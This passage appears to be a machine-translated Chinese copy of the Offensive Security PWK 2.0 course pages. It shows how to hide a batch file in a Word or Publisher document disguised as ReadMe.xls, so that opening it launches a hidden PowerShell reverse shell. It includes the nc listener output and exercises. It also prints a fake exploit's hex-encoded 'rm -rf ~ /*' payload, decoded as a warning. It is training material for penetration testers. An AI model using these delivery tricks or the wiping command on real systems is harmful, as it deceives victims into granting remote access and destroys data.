<div style="position:absolute;top:133838;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选择</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Create from File</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项卡并选择我们新创建的批处理脚本 launch.bat：</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:134197;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">357 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/windows/win32/dataxchg/about-dynamic-data-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:134212;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">交换？重定向自= MSDN</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:134231;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">358 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（SensePost，2017 年），https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/</font></font></font></nobr></div>
<div style="position:absolute;top:134251;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">359 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2017 年），https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/ADV170021</font></font></font></nobr></div>
<div style="position:absolute;top:134271;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">360 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Object_Linking_and_Embedding</font></font></font></nobr></div>
<div style="position:absolute;top:134291;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">361 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Batch_file</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:134419;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="114"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 114 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:134452;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:135529;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:135529;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:135529;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">434</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:134838;left:304"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 251：在 Microsoft Word 中嵌入快捷方式文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:134870;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们还可以更改 Word 文档中批处理文件的外观，使其看起来</font></font></nobr></div>
<div style="position:absolute;top:134889;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更良性。</font><font style="vertical-align: inherit;">为此，我们只需选中</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Display as icon</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">复选框并选择</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Change Icon</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font></font></nobr></div>
<div style="position:absolute;top:134908;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这会调出如图 252 所示的菜单框，允许我们进行更改：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:135218;left:382"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 252：选择图标</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:135249;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">即使这是一个嵌入的批处理文件，Microsoft 也允许我们为其选择不同的图标并</font></font></nobr></div>
<div style="position:absolute;top:135269;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输入标题，这是受害者将看到的内容，而不是实际的文件名。</font><font style="vertical-align: inherit;">在示例中</font></font></nobr></div>
<div style="position:absolute;top:135288;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上面，我们选择了 Microsoft Excel 的图标以及 ReadMe.xls 的名称来完全屏蔽</font></font></nobr></div>
<div style="position:absolute;top:135307;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">批处理文件试图降低受害者的怀疑。</font><font style="vertical-align: inherit;">接受菜单选项后，</font></font></nobr></div>
<div style="position:absolute;top:135327;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">批处理文件嵌入在 Microsoft Word 文档中。</font><font style="vertical-align: inherit;">接下来，必须诱骗受害者</font></font></nobr></div>
<div style="position:absolute;top:135346;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">双击它并接受如图 253 所示的安全警告： </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:135607;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="115"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 115 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:135640;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:136717;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:136717;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:136717;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">435</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:136133;left:333"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 253：打开嵌入的快捷方式</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:136164;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦受害者接受警告，cmd.exe 就会启动。</font><font style="vertical-align: inherit;">再一次，我们有能力</font></font></nobr></div>
<div style="position:absolute;top:136183;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行任意程序，并且必须将其转换为使用 Base64 执行 PowerShell</font></font></nobr></div>
<div style="position:absolute;top:136203;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">编码命令。</font><font style="vertical-align: inherit;">这次的转换很简单，我们只要改成cmd.exe即可</font></font></nobr></div>
<div style="position:absolute;top:136222;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到以前使用的 PowerShell 调用，如清单 400 所示。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:136257;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启动 powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBj....</font></font></nobr></div>
<div style="position:absolute;top:136276;left:328"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 400 - 批处理文件启动反向 shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:136306;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">嵌入更新的批处理文件后，双击它会产生一个工作的反向 shell。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:136340;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nc -lvnp 4444</font></font></font></b></nobr></div>
<div style="position:absolute;top:136358;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听[任何] 4444 ...</font></font></nobr></div>
<div style="position:absolute;top:136375;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从（未知）[10.11.0.22] 50115 连接到 [10.11.0.4]</font></font></nobr></div>
<div style="position:absolute;top:136391;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows [版本 10.0.17134.590]</font></font></nobr></div>
<div style="position:absolute;top:136408;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(c) 2018 年微软公司。</font><font style="vertical-align: inherit;">版权所有。</font></font></nobr></div>
<div style="position:absolute;top:136443;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\Offsec&gt;</font></font></nobr></div>
<div style="position:absolute;top:136462;left:323"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 401 - 从我们的 OLE 对象接收的 Shell</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:136493;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13.3.3.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:136523;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 使用 PowerShell 负载创建批处理文件并将其嵌入 Microsoft Word</font></font></nobr></div>
<div style="position:absolute;top:136542;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文档以向您的 Kali 系统发送一个反向 shell。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:136577;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13.3.4</font></font></i></nobr></div>
<div style="position:absolute;top:136577;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">逃避受保护的视图</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:136615;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此 Microsoft Word 文档在本地提供时非常有效，但从</font></font></nobr></div>
<div style="position:absolute;top:136634;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">互联网，比如通过电子邮件或下载链接，我们必须绕过另一层保护 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:136795;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="116"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 116 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:136828;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:137905;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:137905;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:137905;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">436</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:136924;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">被称为受保护的视图，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">362</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">禁用文档中的所有编辑和修改，</font></font></nobr></div>
<div style="position:absolute;top:136943;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">阻止宏或嵌入对象的执行。</font></font></nobr></div>
<div style="position:absolute;top:136976;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了模拟这种情况，我们将复制包含我们嵌入的 Microsoft Word 文档</font></font></nobr></div>
<div style="position:absolute;top:136995;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">批处理文件到我们的 Kali 机器并将其托管在 Apache 服务器上。</font><font style="vertical-align: inherit;">然后我们可以下载</font></font></nobr></div>
<div style="position:absolute;top:137015;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来自服务器的文档并在我们的受害者机器上打开它。</font><font style="vertical-align: inherit;">此时，受保护的视图是</font></font></nobr></div>
<div style="position:absolute;top:137034;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如图 254 所示，我们无法执行批处理文件。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:137196;left:356"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 254：运行中的受保护视图</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:137227;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然受害者可能会单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启用编辑</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并退出受保护的视图，但这不太可能。</font><font style="vertical-align: inherit;">理想情况下，我们会</font></font></nobr></div>
<div style="position:absolute;top:137246;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更喜欢完全绕过受保护的视图，一种直接的方法是使用</font></font></nobr></div>
<div style="position:absolute;top:137265;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">另一个 Office 应用程序。</font></font></nobr></div>
<div style="position:absolute;top:137298;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与 Microsoft Word 一样，Microsoft Publisher 允许嵌入对象并最终执行代码</font></font></nobr></div>
<div style="position:absolute;top:137317;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以与 Word 和 Excel 完全相同的方式，但不会为 Internet 启用受保护的视图-</font></font></nobr></div>
<div style="position:absolute;top:137337;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">交付的文件。</font><font style="vertical-align: inherit;">我们可以使用我们之前应用于 Word 的策略来绕过这些</font></font></nobr></div>
<div style="position:absolute;top:137356;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">限制，但缺点是 Publisher 的安装频率低于 Word 或 Excel。</font><font style="vertical-align: inherit;">仍然，</font></font></nobr></div>
<div style="position:absolute;top:137376;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果您的指纹检测检测到安装了 Publisher，这可能是一个可行且更好的载体。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:137410;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13.3.4.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:137440;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.通过模拟下载Microsoft Word触发Protected View的保护</font></font></nobr></div>
<div style="position:absolute;top:137459;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来自互联网的文档。</font></font></nobr></div>
<div style="position:absolute;top:137488;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 重复使用批处理文件并将其嵌入到 Microsoft Publisher 文档中以接收反向</font></font></nobr></div>
<div style="position:absolute;top:137507;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">壳到你的 Kali 系统。</font></font></nobr></div>
<div style="position:absolute;top:137535;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.将文件移动到Apache web服务器，模拟Publisher文档的下载</font></font></nobr></div>
<div style="position:absolute;top:137555;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并确认缺少的受保护视图。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:137592;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13.4 总结</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:137633;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">客户端攻击媒介特别阴险，因为它们利用客户端软件的弱点，</font></font></nobr></div>
<div style="position:absolute;top:137653;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如浏览器，而不是利用服务器软件。</font><font style="vertical-align: inherit;">这通常涉及某种形式的用户</font></font></nobr></div>
<div style="position:absolute;top:137672;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">交互和欺骗，以便客户端软件执行恶意代码。</font></font></nobr></div>
<div style="position:absolute;top:137705;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些攻击媒介对攻击者特别有吸引力，因为它们不需要直接</font></font></nobr></div>
<div style="position:absolute;top:137724;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或对受害者机器的可路由访问。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:137855;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">362 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2019 年），https://support.office.com/en-us/article/what-is-protected-view-d6f09ac7-e6b9-4495-8e43-2bbcdbcb6653</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:137983;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="117"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 117 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:138016;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:139093;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:139093;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:139093;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">437</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:138112;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本模块中，我们描述了在此类问题中需要考虑的一些重要因素</font></font></nobr></div>
<div style="position:absolute;top:138131;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击并遍历涉及恶意 HTML 应用程序和</font></font></nobr></div>
<div style="position:absolute;top:138150;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">微软 Word 文档。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:139171;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="118"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 118 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:139204;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:140281;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:140281;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:140281;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">438</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:139294;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13.4.1.1.1</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:25px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:139320;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">14. 定位公共漏洞</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:139364;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本单元中，我们将重点介绍托管公开漏洞利用的各种在线资源</font></font></nobr></div>
<div style="position:absolute;top:139384;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞。</font><font style="vertical-align: inherit;">我们还将检查 Kali 中可用的包含本地托管漏洞的离线工具。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:139421;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">14.1 注意事项</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:139463;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重要的是要了解，通过下载和运行公共漏洞，我们可以极大地</font></font></nobr></div>
<div style="position:absolute;top:139482;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">危及任何运行该代码的系统。</font><font style="vertical-align: inherit;">考虑到这一点，我们需要仔细阅读并</font></font></nobr></div>
<div style="position:absolute;top:139501;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在执行之前了解代码以确保没有负面影响。</font></font></nobr></div>
<div style="position:absolute;top:139534;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0pen0wn 为例</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，它是作为 SSH 的远程漏洞发布的。</font><font style="vertical-align: inherit;">在阅读《</font></font></nobr></div>
<div style="position:absolute;top:139554;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">源代码，我们注意到它要求root权限，这立即引起了怀疑：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:139588;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果（geteuid（））{</font></font></nobr></div>
<div style="position:absolute;top:139606;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">puts("原始套接字等需要Root"); </font><font style="vertical-align: inherit;">返回 1；</font></font></nobr></div>
<div style="position:absolute;top:139622;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></nobr></div>
<div style="position:absolute;top:139642;left:213"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 402 - 恶意 SSH 漏洞利用请求在攻击机器上获得 root 权限</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:139671;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对有效载荷的进一步检查揭示了一个有趣的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">jmpcode</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数组：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:139706;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[...]</font></font></nobr></div>
<div style="position:absolute;top:139723;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字符 jmpcode[] =</font></font></nobr></div>
<div style="position:absolute;top:139740;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"</font></font></nobr></div>
<div style="position:absolute;top:139757;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26";</font></font></nobr></div>
<div style="position:absolute;top:139774;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[...]</font></font></nobr></div>
<div style="position:absolute;top:139793;left:297"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 403 - 恶意 SSH 漏洞利用十六进制编码的有效载荷</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:139823;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然它被屏蔽为 shellcode，但</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">jmpcode</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字符数组实际上是一个十六进制编码的</font></font></nobr></div>
<div style="position:absolute;top:139842;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包含恶意 shell 命令的字符串：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:139877;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">蟒蛇</font></font></font></b></nobr></div>
<div style="position:absolute;top:139911;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&gt;&gt;&gt; jmpcode = [</font></font></nobr></div>
<div style="position:absolute;top:139928;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">... "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"</font></font></nobr></div>
<div style="position:absolute;top:139945;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">... "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26"]</font></font></nobr></div>
<div style="position:absolute;top:139962;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&gt;&gt;&gt; 打印 jmpcode</font></font></nobr></div>
<div style="position:absolute;top:139978;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[' </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">rm -rf ~ /* 2&gt; /dev/null &amp;</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ']</font></font></nobr></div>
<div style="position:absolute;top:139996;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&gt;&gt;&gt;</font></font></nobr></div>
<div style="position:absolute;top:140015;left:227"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 404 - 恶意 SSH 漏洞利用有效载荷，将擦除您的攻击机器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:140044;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个单一的命令将有效地清除攻击者的基于 UNIX 的文件系统。</font><font style="vertical-align: inherit;">在行中</font></font></nobr></div>
<div style="position:absolute;top:140064;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">随后，程序将连接到公共 IRC 服务器，向用户宣布用户的愚蠢行为</font></font></nobr></div>
<div style="position:absolute;top:140083;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">世界，使其成为极其危险且可能令人尴尬的恶意利用！</font></font></nobr></div>
